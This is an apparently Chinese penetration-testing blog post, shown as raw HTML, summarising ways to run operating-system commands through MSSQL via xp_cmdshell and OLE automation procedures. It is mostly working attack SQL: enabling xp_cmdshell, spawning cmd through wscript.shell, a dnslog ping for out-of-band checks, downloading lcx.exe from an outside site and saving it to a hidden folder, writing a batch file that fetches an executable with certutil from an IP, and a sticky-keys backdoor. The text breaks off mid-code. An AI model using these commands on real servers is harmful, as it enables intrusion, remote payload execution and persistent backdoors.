<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>数据库执行命令总结</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>数据库执行命令总结</h2><h1 id="0x1-MSSQL"><a href="#0x1-MSSQL" class="headerlink" title="0x1. MSSQL"></a>0x1. MSSQL</h1><h2 id="0x1-1-XP-CMDSHELL"><a href="#0x1-1-XP-CMDSHELL" class="headerlink" title="0x1.1 XP_CMDSHELL"></a>0x1.1 XP_CMDSHELL</h2><p>这是个MSSQL内置用来执行命令的组件</p>
<ul>
<li>判断xp_cmdshell状态</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> xtype为对象类型，xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span>这里表示xp_cmdshell的对象类型为扩展存储过程。<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 只用判断存在，利用<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)即可, 返回<span class="hljs-number">1</span>即存在<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string"><code class="language-hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> xtype为对象类型，xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span>这里表示xp_cmdshell的对象类型为扩展存储过程。<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 只用判断存在，利用<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)即可, 返回<span class="hljs-number">1</span>即存在<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>启用xp_cmdshell</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number"><code class="language-hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<br></code></pre></td></tr></table></figure>

<ul>
<li>利用xp_cmdshell执行命令</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>恢复xp_cmdshell</li>
</ul>
<p>如果这个dll被删了，可能需要重写一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 默认路径 C:\Program Files\Microsoft <span class="hljs-keyword">SQL</span> Server\MSSQL10_50.MSSQLSERVER\MSSQL\Binn\xplog70.dll<br><span class="hljs-keyword">Exec</span> master.dbo.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-string">&#x27;D:\\xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_cmdshell ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string"><code class="language-hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 默认路径 C:\Program Files\Microsoft <span class="hljs-keyword">SQL</span> Server\MSSQL10_50.MSSQLSERVER\MSSQL\Binn\xplog70.dll<br><span class="hljs-keyword">Exec</span> master.dbo.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-string">&#x27;D:\\xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_cmdshell ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xplog70.dll&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="0x1-2-OLE存储过程"><a href="#0x1-2-OLE存储过程" class="headerlink" title="0x1.2 OLE存储过程"></a>0x1.2 OLE存储过程</h2><p>OLE 也就是 Object Linking and Embedding ，可以将一些对象链接进入另一些应用程序，底层是通过重新封装了COM（Component Object Model），主要是可以用来调用一些COM对象，例如WMI, XML, HTTP, WScript, VBScripts…</p>
<ul>
<li>常用的OLE与COM交互函数：<ul>
<li>sp_OACreate – Creates an instance of an OLE object.</li>
<li>sp_OAMethod – Calls a method of an OLE object.</li>
<li>sp_OAGetProperty – Gets a property value of an OLE object.</li>
<li>sp_OASetProperty – Sets a property of an OLE object to a new value.</li>
<li>sp_OADestroy – Destroys a created OLE object.</li>
<li>sp_OAGetErrorInfo – Obtains OLE Automation error information.</li>
<li>sp_OAStop – Stops the server-wide OLE Automation stored procedure execution environment.</li>
</ul>
</li>
</ul>
<ul>
<li>判断SP_OACREATE是否存在</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;SP_OACREATE&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;SP_OACREATE&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;SP_OACREATE&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>启用OLE Automation Procedures</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;   <br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;   <br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;   <br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;<br></code></pre></td></tr></table></figure>

<ul>
<li>执行系统命令</li>
</ul>
<p>可以看到，这下面是调用的wscript.shell </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c ping 7bse4q.dnslog.cn&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>下载文件</li>
</ul>
<p>通过filesystemobject下载文件</p>
<p><img src="/2022/06/12/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/image-20220612111051730.png" alt="image-20220612111051730"></p>
<p>通过scriptControl下载文件</p>
<p><img src="/2022/06/12/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/image-20220612111527119.png" alt="image-20220612111527119"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@b</span> <span class="hljs-type">varbinary</span>(<span class="hljs-number">8000</span>),<span class="hljs-variable">@hr</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@http</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@down</span> <span class="hljs-type">int</span> <br><span class="hljs-keyword">exec</span> sp_oacreate [microsoft.xmlhttp],<span class="hljs-variable">@http</span> output <span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@http</span>,[<span class="hljs-keyword">open</span>],<span class="hljs-keyword">null</span>,[<span class="hljs-keyword">get</span>],[http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.jestina.co.kr<span class="hljs-operator">/</span>UpData<span class="hljs-operator">/</span>Popup<span class="hljs-operator">/</span>lcx.exe],<span class="hljs-number">0</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@http</span>,[send],<span class="hljs-keyword">null</span> <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oagetproperty <span class="hljs-variable">@http</span>,[responsebody],<span class="hljs-variable">@b</span> output <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oacreate [adodb.stream],<span class="hljs-variable">@down</span> output <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oasetproperty <span class="hljs-variable">@down</span>,[type],<span class="hljs-number">1</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oasetproperty <span class="hljs-variable">@down</span>,[mode],<span class="hljs-number">3</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oamethod <span class="hljs-variable">@down</span>,[<span class="hljs-keyword">open</span>],<span class="hljs-keyword">null</span> <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oamethod <span class="hljs-variable">@down</span>,[write],<span class="hljs-keyword">null</span>,<span class="hljs-variable">@b</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oamethod <span class="hljs-variable">@down</span>,[savetofile],<span class="hljs-keyword">null</span>,[d:\RECYCLER\l.exe],<span class="hljs-number"><code class="language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@b</span> <span class="hljs-type">varbinary</span>(<span class="hljs-number">8000</span>),<span class="hljs-variable">@hr</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@http</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@down</span> <span class="hljs-type">int</span> <br><span class="hljs-keyword">exec</span> sp_oacreate [microsoft.xmlhttp],<span class="hljs-variable">@http</span> output <span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@http</span>,[<span class="hljs-keyword">open</span>],<span class="hljs-keyword">null</span>,[<span class="hljs-keyword">get</span>],[http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.jestina.co.kr<span class="hljs-operator">/</span>UpData<span class="hljs-operator">/</span>Popup<span class="hljs-operator">/</span>lcx.exe],<span class="hljs-number">0</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@http</span>,[send],<span class="hljs-keyword">null</span> <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oagetproperty <span class="hljs-variable">@http</span>,[responsebody],<span class="hljs-variable">@b</span> output <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oacreate [adodb.stream],<span class="hljs-variable">@down</span> output <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oasetproperty <span class="hljs-variable">@down</span>,[type],<span class="hljs-number">1</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oasetproperty <span class="hljs-variable">@down</span>,[mode],<span class="hljs-number">3</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oamethod <span class="hljs-variable">@down</span>,[<span class="hljs-keyword">open</span>],<span class="hljs-keyword">null</span> <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oamethod <span class="hljs-variable">@down</span>,[write],<span class="hljs-keyword">null</span>,<span class="hljs-variable">@b</span>  <br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@hr</span><span class="hljs-operator">=</span>sp_oamethod <span class="hljs-variable">@down</span>,[savetofile],<span class="hljs-keyword">null</span>,[d:\RECYCLER\l.exe],<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>



<ul>
<li>写文件</li>
</ul>
<p>文件操作都是用的scripting.filesystemobject</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@sp</span>_passwordxieo <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span>;<br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@sp</span>_passwordxieo <span class="hljs-keyword">out</span>;<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@sp</span>_passwordxieo, <span class="hljs-string">&#x27;createtextfile&#x27;</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">&#x27;c:\www\1.bat&#x27;</span>, <span class="hljs-number">1</span>;<br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;@echo off&#x27;</span>;<br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;start cmd /k &quot;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&quot;&#x27;</span>;<br><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\www\1.bat&#x27;</span><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@sp</span>_passwordxieo <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span>;<br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@sp</span>_passwordxieo <span class="hljs-keyword">out</span>;<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@sp</span>_passwordxieo, <span class="hljs-string">&#x27;createtextfile&#x27;</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">&#x27;c:\www\1.bat&#x27;</span>, <span class="hljs-number">1</span>;<br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;@echo off&#x27;</span>;<br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;start cmd /k &quot;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&quot;&#x27;</span>;<br><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\www\1.bat&#x27;</span><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\www\file.exe&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>删除文件</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@result</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@fso</span>_token <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@fso</span>_token <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@fso</span>_token,<span class="hljs-string">&#x27;deletefile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\1.txt&#x27;</span><br><span class="hljs-keyword">exec</span> sp_oadestroy <span class="hljs-variable"><code class="language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@result</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@fso</span>_token <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@fso</span>_token <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@fso</span>_token,<span class="hljs-string">&#x27;deletefile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\1.txt&#x27;</span><br><span class="hljs-keyword">exec</span> sp_oadestroy <span class="hljs-variable">@fso</span>_token<br></code></pre></td></tr></table></figure>

<ul>
<li>复制文件</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>,<span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>,<span class="hljs-string">&#x27;copyfile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\1.txt&#x27;</span>,<span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>,<span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>,<span class="hljs-string">&#x27;copyfile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\1.txt&#x27;</span>,<span class="hljs-string">&#x27;c:\2.txt&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>移动文件</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>,<span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>,<span class="hljs-string">&#x27;movefile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\1.txt&#x27;</span>,<span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>,<span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>,<span class="hljs-string">&#x27;movefile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\1.txt&#x27;</span>,<span class="hljs-string">&#x27;c:\3.txt&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>替换粘滞键</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>,<span class="hljs-string">&#x27;copyfile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\explorer.exe&#x27;</span>, <span class="hljs-string">&#x27;c:\windows\system32\sethc.exe&#x27;</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@oo</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@oo</span> i<span class="hljs-operator">=</span><span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@oo</span>,<span class="hljs-string">&#x27;copyfile&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\sethc.exe&#x27;</span>,<span class="hljs-string"><code class="language-hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span 